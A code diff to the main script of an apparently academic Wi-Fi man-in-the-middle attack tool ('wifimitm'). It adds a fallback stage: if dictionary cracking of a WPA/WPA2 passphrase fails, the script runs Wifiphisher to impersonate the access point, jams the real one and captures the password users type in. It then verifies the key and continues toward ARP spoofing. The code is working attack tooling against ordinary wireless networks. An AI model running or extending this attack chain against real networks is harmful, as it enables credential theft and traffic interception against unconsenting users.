@@ -23,10 +23,12 @@ import setuptools_scm
 from wifimitm.access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
 from wifimitm.capture import Dumpcap
 from wifimitm.common import WirelessScanner
+from wifimitm.model import WirelessAccessPoint
 from wifimitm.model import WirelessInterface
 from wifimitm.requirements import Requirements, RequirementError, UidRequirement
 from wifimitm.topology import ArpSpoofing
-from wifimitm.wpa2 import PassphraseNotInDictionaryError
+from wifimitm.wpa2 import PassphraseNotInDictionaryError, Wpa2Cracker, verify_psk
+from wifimitm.impersonation import Wifiphisher
 
 __version__ = setuptools_scm.get_version()
 __author__ = 'Martin Vondracek'
@@ -58,6 +60,15 @@ class ExitCode(Enum):
 
     PASSPHRASE_NOT_IN_DICTIONARY = 80
     """WPA/WPA2 passphrase was not found in available dictionary/dictionaries"""
+
+    PHISHING_INCORRECT_PSK = 81
+    """WPA/WPA2 passphrase obtained from phishing attack is incorrect"""
+
+    SUBPROCESS_ERROR = 82
+    """Failure in subprocess."""
+
+    KEYBOARD_INTERRUPT = 130
+    """received KeyboardInterrupt, SIGINT"""
 
 
 def main():
@@ -98,7 +109,7 @@ def main():
 
         interface.stop_monitor_mode()
 
-        target = None
+        target = None  # type: Optional[WirelessAccessPoint]
         for ap in scan:
             if ap.essid == config.essid:
                 target = ap
@@ -107,17 +118,45 @@ def main():
                 break
 
         if target:
+            print('AP files @ {}'.format(target.dir_path))
+
             interface.start_monitor_mode(target.channel)
             wireless_unlocker = WirelessUnlocker(ap=target, if_mon=interface.name)
             try:
                 print('unlocking')
                 wireless_unlocker.start()
             except PassphraseNotInDictionaryError:
+                print('Passphrase not in dictionary.')
+            finally:
                 interface.stop_monitor_mode()
-                print('Passphrase not in dictionary.', file=sys.stderr)
-                return ExitCode.PASSPHRASE_NOT_IN_DICTIONARY.value
 
-            interface.stop_monitor_mode()
+            if not target.is_cracked():
+                if config.phishing_enabled:
+                    # try phishing attack to catch password from users
+                    print('Try to impersonate AP and perform phishing attack.')
+                    try:
+                        print('start wifiphisher')
+                        with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
+                            while not wifiphisher.password:
+                                wifiphisher.update()
+                                if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
+                                    raise Wifiphisher.UnexpectedTerminationError()
+                                time.sleep(3)
+
+                            if not verify_psk(target, wifiphisher.password):
+                                print('Caught password is not correct.', file=sys.stderr)
+                                return ExitCode.PHISHING_INCORRECT_PSK.value
+                    except KeyboardInterrupt:
+                        print('stopping')
+                        return ExitCode.KEYBOARD_INTERRUPT.value
+                    except Wifiphisher.UnexpectedTerminationError:
+                        print('Wifiphisher unexpectedly terminated.', file=sys.stderr)
+                        return ExitCode.SUBPROCESS_ERROR.value
+                else:
+                    print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
+                          'Attack unsuccessful.', file=sys.stderr)
+                    return ExitCode.PASSPHRASE_NOT_IN_DICTIONARY.value
+
             print('unlocked')
 
             wireless_connecter = WirelessConnecter(interface=interface.name)
@@ -170,6 +209,7 @@ class Config:
 
     def __init__(self):
         self.logging_level = None  # type: Optional[int]
+        self.phishing_enabled = None  # type: Optional[bool]
         self.capture_file = None  # type: Optional[BinaryIO]  TODO(xvondr20) Close if dumpcap did not close it.
         self.essid = None  # type: Optional[str]
         # TODO(xvondr20) Implement BSSID arg self.target_bssid = None
@@ -221,6 +261,10 @@ class Config:
                             choices=cls.LOGGING_LEVELS_DICT,
                             help='select logging level (default: %(default)s)'
                             )
+        parser.add_argument('-p', '--phishing',
+                            action='store_true',
+                            help='enable phishing attack if dictionary attack fails',
+                            )
         parser.add_argument('-cf', '--capture-file',
                             type=argparse.FileType('wb'),
                             help='capture network traffic to provided file'
@@ -257,6 +301,8 @@ class Config:
 
         # name to value conversion as noted in `self.init_parser`
         self.logging_level = self.LOGGING_LEVELS_DICT[parsed_args.logging_level]
+
+        self.phishing_enabled = parsed_args.phishing
 
         if parsed_args.capture_file:
             # `"FileType objects understand the pseudo-argument '-' and automatically convert this into sys.stdin
